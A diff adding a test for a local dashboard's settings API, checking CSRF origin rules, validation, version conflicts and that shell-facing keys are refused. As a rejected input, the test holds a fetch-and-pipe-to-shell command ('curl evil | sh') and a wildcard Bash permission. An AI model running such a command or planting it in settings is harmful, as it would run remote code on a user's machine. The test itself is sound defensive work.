@@ -12,7 +12,6 @@ import { parseFrontmatter, setNoteFields, readNoteText } from '../skills/secreta
 import { classify, decide } from '../skills/secretary/scripts/lib/guard.mjs';
 import { createServer, listen, isLocalHost, resolveStatic } from '../skills/secretary/scripts/lib/server.mjs';
 import { leadParagraph } from '../skills/secretary/scripts/lib/dashboard.mjs';
-import { loadConfig } from '../skills/secretary/scripts/lib/config.mjs';
 import { mapAppleEvents, appleSupported } from '../skills/secretary/scripts/lib/apple.mjs';
 import { loadConfig, defaultSettings } from '../skills/secretary/scripts/lib/config.mjs';
 import { briefingJobs, claudeArgs, cronLine, plist } from '../skills/secretary/scripts/lib/schedule.mjs';
@@ -300,6 +299,65 @@ test('dashboard server: read-only API, localhost only, no path escapes', async (
     assert.equal(d.permissions.send_email, 'off');
     assert.ok(Array.isArray(d.events));
     assert.ok(isLocalHost('localhost:7410') && isLocalHost('127.0.0.1') && !isLocalHost('localhost.evil.com'));
+  } finally { server.close(); }
+});
+
+test('dashboard settings: patch Settings.md through validation, same-site JSON only', async () => {
+  const { home, run } = sandbox();
+  assert.equal(run('init', '--non-interactive', '--vault', path.join(home, 'V'), '--set', `timezone=${NY}`, '--set', 'calendar_feeds=https://p01.example.com/published/2/abcdefghijklmnopSECRETTOKEN,webcal://b.example/x.ics').code, 0);
+  const sp = path.join(home, 'V', 'Secretary', 'Settings.md');
+  fs.writeFileSync(sp, fs.readFileSync(sp, 'utf8').replace('---\n', '---\nmy_custom: keep me\n') + '\nMy own notes.\n');
+  const getConfig = () => { const prev = process.env.HOME; process.env.HOME = home; try { return loadConfig(); } finally { process.env.HOME = prev; } };
+  const server = createServer({ uiDir: fs.mkdtempSync(path.join(os.tmpdir(), 'sec-ui-')), getConfig });
+  const port = await listen(server, 0);
+  const base = `http://127.0.0.1:${port}/api/settings`;
+  const post = (body, headers = {}) => fetch(base, { method: 'POST', headers: { 'content-type': 'application/json', origin: `http://localhost:${port}`, ...headers }, body: typeof body === 'string' ? body : JSON.stringify(body) });
+  try {
+    const view = await (await fetch(base)).json();
+    assert.equal(view.values.timezone, NY);
+    assert.equal(view.values.permission_send_email, 'off');
+    assert.ok(!('calendar_publish_command' in view.values) && !('calendar_feeds' in view.values));
+    assert.ok(!JSON.stringify(view).includes('SECRETTOKEN'));
+    assert.equal(view.calendar_feeds.length, 2);
+
+    // CSRF: wrong or missing origin, cross-site fetch metadata, non-JSON bodies
+    assert.equal((await post({ version: view.version, changes: {} }, { origin: 'https://evil.example' })).status, 403);
+    assert.equal((await fetch(base, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' })).status, 403);
+    assert.equal((await post({ version: view.version, changes: {} }, { 'sec-fetch-site': 'cross-site' })).status, 403);
+    assert.equal((await post('name=x', { 'content-type': 'application/x-www-form-urlencoded' })).status, 403);
+    assert.equal((await post('{nope')).status, 400);
+    assert.equal((await fetch(`http://127.0.0.1:${port}/api/home`, { method: 'POST', headers: { 'content-type': 'application/json', origin: `http://localhost:${port}` }, body: '{}' })).status, 405);
+
+    // shell-facing and unknown keys are refused; validation errors come back as a list
+    for (const changes of [{ calendar_publish_command: 'curl evil | sh' }, { briefing_allowed_tools: ['Bash(*)'] }, { type: 'x' }, { bogus: 1 }]) {
+      assert.equal((await post({ version: view.version, changes })).status, 400, JSON.stringify(changes));
+    }
+    assert.equal((await post({ version: view.version, changes: { name: 'a\nb: c' } })).status, 400);
+    assert.equal((await post({ version: view.version, changes: { meeting_buffer_min: '10' } })).status, 400);
+    const bad = await post({ version: view.version, changes: { work_start: '9am', permission_send_email: 'always', work_days: ['mon', 'funday'] } });
+    assert.equal(bad.status, 422);
+    assert.equal((await bad.json()).errors.length, 3);
+    assert.equal((await post({ version: 'stale', changes: { name: 'X' } })).status, 409);
+
+    const ok = await post({ version: view.version, changes: { name: 'Casey', permission_send_email: 'ask', vips: ['Ana', ' '], briefing_evening: 'off', calendar_feeds: { keep: [1], add: ['https://new.example/feed.ics'] } } });
+    assert.equal(ok.status, 200);
+    const saved = await ok.json();
+    assert.deepEqual(saved.changed.sort(), ['briefing_evening', 'calendar_feeds', 'name', 'permission_send_email', 'vips']);
+    assert.equal(saved.schedule_changed, true);
+    assert.notEqual(saved.settings.version, view.version);
+    const text = fs.readFileSync(sp, 'utf8');
+    assert.match(text, /my_custom: keep me/);
+    assert.match(text, /My own notes\.\n$/);
+    assert.match(text, /# Secretary settings/);
+    const st = getConfig().settings;
+    assert.equal(st.name, 'Casey');
+    assert.equal(st.permission_send_email, 'ask');
+    assert.deepEqual(st.vips, ['Ana']);
+    assert.equal(st.briefing_evening, '');
+    assert.deepEqual(st.calendar_feeds, ['webcal://b.example/x.ics', 'https://new.example/feed.ics']);
+    assert.equal(st.calendar_publish_command, defaultSettings().calendar_publish_command);
+    const again = await (await post({ version: saved.settings.version, changes: { name: 'Casey' } })).json();
+    assert.deepEqual(again.changed, []);
   } finally { server.close(); }
 });
 
